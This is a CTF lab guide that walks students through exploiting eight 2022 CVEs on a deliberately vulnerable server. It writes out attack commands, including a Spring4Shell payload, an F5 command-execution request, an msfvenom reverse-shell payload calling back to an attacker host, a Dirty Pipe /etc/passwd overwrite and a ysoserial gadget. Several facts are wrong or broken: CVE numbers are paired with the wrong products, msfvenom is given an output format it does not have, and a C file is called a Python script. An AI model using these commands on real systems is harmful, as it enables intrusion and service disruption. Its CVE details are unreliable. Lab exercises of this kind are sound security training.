**CTF Challenge Documentation with Hints and Exploitation Guidance**

---

### **Objective**
Provide an easy-to-follow CTF challenge documentation to help students exploit vulnerabilities in the vulnerable Ubuntu server. Each challenge includes hints, exploitation steps, recommended tools, and expected outcomes to confirm the exploit.

---

### **Challenge 1: CVE-2022-22965 (Spring4Shell)**
**Vulnerability Type:** Injection

**Service Port:** 8080

**Description:** A remote code execution (RCE) vulnerability in Spring Framework.

**Hint:**
- Look for endpoints accepting data from users.
- Check if the application exposes HTTP methods like `POST` and `PUT`.

**Tools:**
- Burp Suite
- `curl`
- Spring4Shell exploit script (public GitHub repos available)

**Exploitation Steps:**
1. Intercept a request to the vulnerable endpoint using Burp Suite.
2. Modify the request payload to inject malicious code.
3. Use a payload such as:
   ```bash
   curl -X POST http://<server_ip>:8080/demo/endpoint --header "Content-Type: application/x-www-form-urlencoded" --data "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{code_here}"
   ```

**Expected Outcome:**
A reverse shell or `whoami` response indicating command execution.

---

### **Challenge 2: CVE-2022-1388 (F5 Big-IP Auth Bypass)**
**Vulnerability Type:** Identification and Authentication Failures

**Service Port:** 443

**Description:** An authentication bypass in the F5 Big-IP system allowing unauthorized users to access admin endpoints.

**Hint:**
- Focus on the `mgmt/tm/util/bash` endpoint.
- Check for lack of header validation.

**Tools:**
- `curl`
- Metasploit (F5 module)

**Exploitation Steps:**
1. Send a crafted `POST` request with the following:
   ```bash
   curl -k -X POST "https://<server_ip>:443/mgmt/tm/util/bash" \
   -H "Authorization: Basic dXNlcjpwYXNzd29yZA==" \
   -d '{"command":"run", "utilCmdArgs":"-c id"}'
   ```
2. Observe the output.

**Expected Outcome:**
Receive an `id` output indicating unauthorized command execution.

---

### **Challenge 3: CVE-2022-30190 (Follina)**
**Vulnerability Type:** Injection

**Service Port:** 80

**Description:** Exploit leveraging MS Office documents with remote template injection.

**Hint:**
- Look for files that reference remote `.docx` URLs.
- Observe the template injection behavior.

**Tools:**
- `msfvenom`
- Python HTTP server (`http.server`)

**Exploitation Steps:**
1. Generate an MS Office `.docx` payload:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f docx > exploit.docx
   ```
2. Host the payload on your HTTP server.
3. Force the vulnerable server to open the document.

**Expected Outcome:**
Receive a Meterpreter session on the listening attacker machine.

---

### **Challenge 4: CVE-2022-0847 (Dirty Pipe)**
**Vulnerability Type:** Injection (Privilege Escalation)

**Service Port:** Local Privilege Escalation

**Description:** A Linux kernel vulnerability that allows privilege escalation.

**Hint:**
- Requires kernel version 5.8 or higher.
- Exploit with file overwrites.

**Tools:**
- Python exploit script (`dirtypipe.c`)
- `gcc` for compilation

**Exploitation Steps:**
1. Download and compile the exploit:
   ```bash
   gcc dirtypipe.c -o dirtypipe
   ```
2. Run the compiled binary:
   ```bash
   ./dirtypipe /etc/passwd "root:x:0:0:root:/root:/bin/bash"
   ```

**Expected Outcome:**
Gain `root` shell or escalate privileges.

---

### **Challenge 5: CVE-2022-21476 (Oracle WebLogic RCE)**
**Vulnerability Type:** Vulnerable and Outdated Components

**Service Port:** 3000

**Description:** An RCE vulnerability in Oracle WebLogic.

**Hint:**
- Look for deserialization vulnerabilities.

**Tools:**
- `ysoserial` (Java deserialization payload generator)

**Exploitation Steps:**
1. Generate an exploit payload using `ysoserial`:
   ```bash
   java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.ser
   ```
2. Send the payload to the vulnerable WebLogic endpoint.

**Expected Outcome:**
Create a file `/tmp/pwned` on the server.

---

### **Challenge 6: CVE-2022-23181 (Jenkins LPE)**
**Vulnerability Type:** Security Misconfiguration

**Service Port:** 9099

**Description:** Jenkins improper configuration leading to local privilege escalation.

**Hint:**
- Check the `/script` console.

**Tools:**
- Browser

**Exploitation Steps:**
1. Navigate to `http://<server_ip>:9099/script`
2. Inject a Groovy script:
   ```groovy
   println "Current User: ${System.getProperty('user.name')}"
   ```

**Expected Outcome:**
View the current user in the Jenkins interface.

---

### **Challenge 7: CVE-2022-30525 (Zyxel Auth Bypass RCE)**
**Vulnerability Type:** Injection

**Service Port:** 7075

**Description:** An authentication bypass vulnerability in Zyxel firewalls allowing remote command execution.

**Hint:**
- Target `/ztp/cgi-bin/handler` endpoint.

**Tools:**
- `curl`
- Python script for automation

**Exploitation Steps:**
1. Craft a `POST` request:
   ```bash
   curl -X POST http://<server_ip>:7075/ztp/cgi-bin/handler -d '{"command":"reboot"}'
   ```

**Expected Outcome:**
The server reboots, demonstrating command execution.

---

### **Challenge 8: CVE-2022-0778 (OpenSSL DoS)**
**Vulnerability Type:** Cryptographic Failures

**Service Port:** 4444

**Description:** A Denial of Service vulnerability in OpenSSL.

**Hint:**
- Focus on the `BN_mod_sqrt()` function.

**Tools:**
- `openssl`
- Public PoC script

**Exploitation Steps:**
1. Run a PoC script against the OpenSSL service:
   ```bash
   python3 openssl_dos.py --target <server_ip>:4444
   ```

**Expected Outcome:**
The service crashes, demonstrating a successful DoS.

---

### **Student Notes:**
1. Always document your steps and observations.
2. Perform post-exploitation analysis by reviewing logs and shell responses.
3. Test payloads in a controlled environment to avoid unexpected behavior.
4. After completion, compare your results with the expected outcomes to validate successful exploitation.

By following this structured approach, students can gain hands-on experience in exploiting real-world vulnerabilities and strengthen their cybersecurity knowledge.

